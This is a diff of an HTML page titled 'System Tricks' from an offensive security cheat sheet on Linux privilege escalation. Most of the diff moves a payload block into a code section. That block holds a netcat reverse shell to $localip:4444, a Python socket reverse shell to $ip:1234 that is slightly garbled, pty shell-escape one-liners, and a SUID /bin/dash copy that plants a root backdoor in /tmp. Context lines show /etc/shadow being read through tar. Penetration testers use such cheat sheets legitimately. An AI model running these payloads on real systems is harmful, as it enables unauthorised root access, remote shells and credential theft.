@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2019-10-07T16:01:08 CEST">
+<meta name="revised" content="2019-10-07T16:14:42 CEST">
 <title>System Tricks :: Offensive Security Cheatsheet</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -1104,7 +1104,7 @@
       <li data-nav-id="/linux-systems/privilege-escalation/suid/" class="dd-item">
         <div>
           <a href="/linux-systems/privilege-escalation/suid/">
-            SUID files
+            SUID Files
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
@@ -1329,7 +1329,7 @@
    Privilege Escalation</option> 
       <option value="/linux-systems/privilege-escalation/system_tricks/"  selected>-- System Tricks</option>
       <option value="/linux-systems/privilege-escalation/abusing_sudo_rights/" >-- Abusing Sudo Rights</option>
-      <option value="/linux-systems/privilege-escalation/suid/" >-- SUID files</option>
+      <option value="/linux-systems/privilege-escalation/suid/" >-- SUID Files</option>
       <option value="/linux-systems/privilege-escalation/services/" >-- Services</option>
       <option value="/linux-systems/privilege-escalation/crontab/" >-- Crontab</option>
   
@@ -1379,33 +1379,6 @@
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/
 https://marc.info/?l<span style="color:#f92672">=</span>full-disclosure<span style="color:#111">&amp;</span><span style="color:#111">m</span><span style="color:#f92672">=</span><span style="color:#ae81ff">128776663124692</span><span style="color:#111">&amp;</span><span style="color:#111">w</span><span style="color:#f92672">=</span><span style="color:#ae81ff">2</span></code></pre></div>
 <p><br/></p>
-
-<h1 id="bin-dash-is-the-only-shell-to-keep-the-sticky-bit-so-if-you-run-as-root-included-cron-or-services-running-as-root">/bin/dash is the only shell to keep the sticky bit, so if you run as root (included cron, or services running as root):</h1>
-
-<p>install -mode 4755 /bin/dash /tmp/sh</p>
-
-<h1 id="then-you-will-have-a-tmp-sh-that-gives-any-user-who-calls-it-root">Then you will have a /tmp/sh that gives any user who calls it root !</h1>
-
-<h1 id="some-payloads-to-overcome-limited-shells">Some payloads to overcome limited shells</h1>
-
-<p>ssh user@$ip nc $localip 4444 -e /bin/sh
-python -c &lsquo;import pty; pty.spawn(&ldquo;/bin/sh&rdquo;)&rsquo;
-export TERM=linux</p>
-
-<h1 id="python">Python</h1>
-
-<p>python -c &lsquo;import pty; pty.spawn(&ldquo;/bin/sh&rdquo;)&rsquo;
-python -c &lsquo;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((&ldquo;$ip&rdquo;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),   *$ 1); os.dup2(s.fileno(),2);p=subprocess.call([&ldquo;/bin/sh&rdquo;,&ldquo;-i&rdquo;]);&rsquo;</p>
-
-<h1 id="bash">Bash</h1>
-
-<p>echo os.system(&lsquo;/bin/bash&rsquo;)
-/bin/sh -i
-exec &ldquo;/bin/sh&rdquo;;</p>
-
-<h1 id="perl">Perl</h1>
-
-<p>perl —e &lsquo;exec &ldquo;/bin/sh&rdquo;;&rsquo;</p>
 
 <h3 id="recon-and-enumeration">Recon and Enumeration</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Look for strange process</span>
@@ -1488,6 +1461,25 @@ getcap -r / <span style="color:#ae81ff">2</span>&gt;/dev/null
 tar -cvf shadow.tar <span style="color:#d88200">&#34;/etc/shadow&#34;</span>
 tar -xvf shadow.tar
 cat etc/shadow</code></pre></div>
+<h4 id="overcome-limited-shells">Overcome limited shells</h4>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Some payloads to overcome limited shells</span>
+ssh user@<span style="color:#111">$ip</span> nc <span style="color:#111">$localip</span> <span style="color:#ae81ff">4444</span> -e /bin/sh
+python -c <span style="color:#d88200">&#39;import pty; pty.spawn(&#34;/bin/sh&#34;)&#39;</span>
+<span style="color:#111">export</span> <span style="color:#111">TERM</span><span style="color:#f92672">=</span>linux
+
+<span style="color:#75715e"># Python</span>
+python -c <span style="color:#d88200">&#39;import pty; pty.spawn(&#34;/bin/sh&#34;)&#39;</span>
+python -c <span style="color:#d88200">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((&#34;$ip&#34;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),   *$ 1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span>
+
+<span style="color:#75715e"># Bash</span>
+<span style="color:#111">echo</span> os.system<span style="color:#f92672">(</span><span style="color:#d88200">&#39;/bin/bash&#39;</span><span style="color:#f92672">)</span>
+/bin/sh -i
+<span style="color:#111">exec</span> <span style="color:#d88200">&#34;/bin/sh&#34;</span><span style="color:#111">;</span>
+
+<span style="color:#75715e"># Perl</span>
+perl —e <span style="color:#d88200">&#39;exec &#34;/bin/sh&#34;;&#39;</span></code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># /bin/dash is the only shell to keep the sticky bit, so if you run as root (included cron, or services running as root):</span> 
+install -mode <span style="color:#ae81ff">4755</span> /bin/dash /tmp/sh
+<span style="color:#75715e"># Then you will have a /tmp/sh that gives any user who calls it root !</span></code></pre></div>
 
     
     
